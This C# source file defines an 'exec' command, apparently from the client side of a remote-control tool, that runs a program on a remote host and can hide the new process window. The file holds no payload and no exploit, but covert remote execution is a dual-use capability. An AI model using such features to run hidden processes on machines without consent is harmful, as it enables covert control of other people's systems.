using System.Collections.Generic;
using Client.AdvancedConsole;
using Client.Commands.Core;

namespace Client.Commands
{
    internal class Execute : IClientCommand
    {
        public string name { get; set; } = "exec";

        public string description { get; set; } = "Execute a program on the remote host computer.\nArguments must be passed in double quotes.\nUse the 'hidden' keyword to hide the new process window.";

        public bool isLocal { get; set; } = false;

        public List<string> validArguments { get; set; } = new List<string>()
        {
            "?:[remoteProgramPath]",
            "?:[remoteProgramPath] ?:[\"arguments\"]",
            "?:[remoteProgramPath] hidden",
            "?:[remoteProgramPath] ?:[\"arguments\"] hidden"
        };


        public void Process(List<string> args)
        {
            if (ClientCommandsManager.networkManager.ReadLine() == "OK")
            {
                ColorTools.WriteCommandSuccess("Program executed");
            }
            else
            {
                ColorTools.WriteCommandError("An error occured, maybe the specified file doesn't exist");
            }
        }
    }
}
